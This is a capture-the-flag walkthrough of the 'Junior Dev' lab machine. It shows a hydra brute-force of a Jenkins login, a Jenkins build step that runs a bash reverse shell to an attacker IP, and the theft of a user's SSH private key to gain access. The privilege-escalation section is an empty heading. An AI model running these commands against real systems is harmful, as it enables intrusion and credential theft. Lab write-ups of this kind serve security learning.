# JuniorDev!
## @Author : M3tr1c_r00t
![image](https://user-images.githubusercontent.com/99975622/210865706-53f990ea-657f-4e80-a31e-3280c0d314f0.png)
**_Junior Dev_** is a medium linux machine which involves bruteforcing into Jenkins to gain access, then involves port forwarding to gain acess to a python web server being run as root and exploit it to gain root priviledges!

### Enumeration...
_**Nmap...**_
```
# Nmap 7.92 scan initiated Sat Dec 24 19:47:32 2022 as: nmap -sC -sV -A -p 22,30609 -oN nmapports.txt 10.150.150.38
Nmap scan report for 10.150.150.38
Host is up (0.23s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 64:63:02:cb:00:44:4a:0f:95:1a:34:8d:4e:60:38:1c (RSA)
|   256 0a:6e:10:95:de:3d:6d:4b:98:5f:f0:cf:cb:f5:79:9e (ECDSA)
|_  256 08:04:04:08:51:d2:b4:a4:03:bb:02:71:2f:66:09:69 (ED25519)
30609/tcp open  http    Jetty 9.4.27.v20200227
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.27.v20200227)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   227.63 ms 10.66.66.1
2   227.66 ms 10.150.150.38

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec 24 19:47:58 2022 -- 1 IP address (1 host up) scanned in 26.91 seconds
```
With only two ports open, we can go and take a look at the web server at _**port 30609**_ ...
![Screenshot from 2022-12-25 07-54-20](https://user-images.githubusercontent.com/99975622/210867918-460e5821-585f-485d-a4ce-fd9b94f36800.png)

The next thing we can do, try to brute force the login page as the box's name is junior dev, so probably there's some kind of misconfiguration.
<br> Also, jenkins doesnt have a default password but has a default username, so we are gonna brute force the login using hydra ...

![Screenshot from 2022-12-25 08-24-21](https://user-images.githubusercontent.com/99975622/210868426-7a4113b1-db9f-4299-bcb1-631608935874.png)

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.150.150.38 -s 30609 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=loginError"
```
Now that we have the creds, let login into the site...
![Screenshot from 2022-12-25 08-25-11](https://user-images.githubusercontent.com/99975622/210868917-d86374ea-b80e-4b0f-badd-c56528718f4c.png)

Next step after login, we can try and look for a way to get a reverse shell onto the server...
You will notice that there is a section for actions and in those actions, there is a section for executing shell commands...
![Screenshot from 2022-12-25 08-25-34](https://user-images.githubusercontent.com/99975622/210869289-3269328f-1ca2-4239-90e5-26eb2034c1c6.png)

So next, change the shell code so that you can get a reverse shell on the server...
```
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
```
After saving the code, click on the build now to execute the command...
![Screenshot from 2022-12-25 08-26-55](https://user-images.githubusercontent.com/99975622/210870240-d45f0582-66ac-479f-b837-3cd998393d8a.png)

And we've gotten our reverse shell...
![Screenshot from 2022-12-25 08-27-58](https://user-images.githubusercontent.com/99975622/210870883-f68fee22-f0ac-42fe-b0a4-1843157a73d7.png)

Next, stabilize the shell, then we can try to find some of the flags...
#### FLAG70
![Screenshot from 2022-12-25 08-28-08](https://user-images.githubusercontent.com/99975622/210871326-f7c5dfdc-d04c-44e5-ba00-77e5f64a2ae7.png)
#### FLAG69
![Screenshot from 2022-12-25 08-30-30](https://user-images.githubusercontent.com/99975622/210871614-83d6c725-6f9b-43ff-a40f-25d979e9d05c.png)
### Local Escalation...
If you check the /etc/passwd file, you'll see that we've gotten a reverse shell as the jenkins web-server...
<br> We're gonna try to get access to the juniordev user...
<br> We can start by checking files in our current directory...
![Screenshot from 2022-12-25 08-30-45](https://user-images.githubusercontent.com/99975622/210872208-277c4b9d-0997-408c-82ea-7fc5ae6a2290.png)
Note that the .bash_history file is owned by jenkins, meaning we have acess...
<br> If we check out the contents of the file, we can see that jenkins can read the contents of the id_rsa file of juniordev and we get his key...
![Screenshot from 2022-12-25 08-31-15](https://user-images.githubusercontent.com/99975622/210872650-b4313c35-599b-40fe-bc80-1aafa94c63df.png)
Save the key to a file, grant the required permissions then ssh as juniordev...
![Screenshot from 2022-12-25 08-35-00](https://user-images.githubusercontent.com/99975622/210872832-c9487cf7-13cc-4843-9bf1-cd07c16ed30d.png)


### Priv Esc...






